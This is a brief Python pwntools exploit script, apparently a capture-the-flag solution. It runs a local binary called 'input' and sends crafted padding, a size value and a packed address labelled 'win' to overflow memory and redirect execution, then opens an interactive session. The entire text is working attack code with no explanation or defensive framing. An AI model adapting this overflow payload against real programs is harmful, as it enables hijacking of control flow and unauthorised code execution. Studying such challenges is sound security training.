from pwn import *
first_chunk = 0x430 - 0x18
second_chunk = p64(0x430 - 0x18)
third_chunk = 0x18 #- 0x8
win = p64(0x00401253)
r = process("./input")
#r.sendline("x")
#r.sendline("x")
#r.sendline("x")
#print(r.recv())

for i in range(0,first_chunk):
    r.send("x")

for c in second_chunk:
    r.send(chr(c).encode())

for i in range(0,third_chunk):
    r.send("b")

for c in win:
    r.send(chr(c).encode())
r.send("F")
r.send("F")
r.interactive()
